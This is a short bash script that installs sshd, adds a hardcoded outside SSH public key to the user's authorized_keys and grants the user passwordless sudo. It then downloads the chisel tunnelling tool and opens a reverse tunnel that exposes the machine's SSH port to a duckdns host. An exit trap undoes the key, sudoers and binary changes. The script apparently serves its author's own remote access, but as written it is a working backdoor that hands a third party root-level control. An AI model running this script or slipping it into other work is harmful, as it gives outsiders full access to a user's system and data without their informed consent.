#!/usr/bin/env bash

testcmd() {
	which "$1" >/dev/null 2>&1
}

try() {
	testcmd "$1" || return 1
	cmd="$1"
	shift
	sudo "$cmd" "$@"
}

install() {
	[ -n "$2" ] && testcmd "$2" && return
	try "apt" "install" "-y" "$1"
	try "pacman" "-S" "--noconfirm" "$1"
}

ver="1.7.7"
getchisel() {
	curl -LO "https://github.com/jpillora/chisel/releases/download/v$ver/chisel_${ver}_linux_amd64.gz"
	gzip -d "chisel_${ver}_linux_amd64.gz"
	chmod +x "chisel_${ver}_linux_amd64"
}

cleanup() {
	sudo rm -f "/etc/sudoers.d/zz-$USER-nopasswd-all"
	file="$(mktemp)"
	head -n-1 "$HOME/.ssh/authorized_keys" > "$file"
	mv "$file" "$HOME/.ssh/authorized_keys"
	rm "chisel_${ver}_linux_amd64"
}

trap cleanup EXIT

# setup sshd
install "openssh" "sshd"
install "openssh-server" "sshd"
find "/etc/ssh/" -type f | grep -Fq "ssh_host" || sudo ssh-keygen -A
pgrep sshd >/dev/null || sudo /usr/bin/sshd

# add my public key
mkdir -p "$HOME/.ssh"
cat >> "$HOME/.ssh/authorized_keys" << EOF
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJVieLCkWGImVI9c7D0Z0qRxBAKf0eaQWUfMn0uyM/Ql leonsch
EOF

# nopasswd this user
sudo mkdir -p "/etc/sudoers.d"
sudo tee "/etc/sudoers.d/zz-$USER-nopasswd-all" << EOF
$USER ALL=(ALL) NOPASSWD: ALL
EOF

# setup chisel
install "gzip" "gzip"
getchisel
"./chisel_${ver}_linux_amd64" "client" "42loco42.duckdns.org:37812" "R:2222:localhost:22"
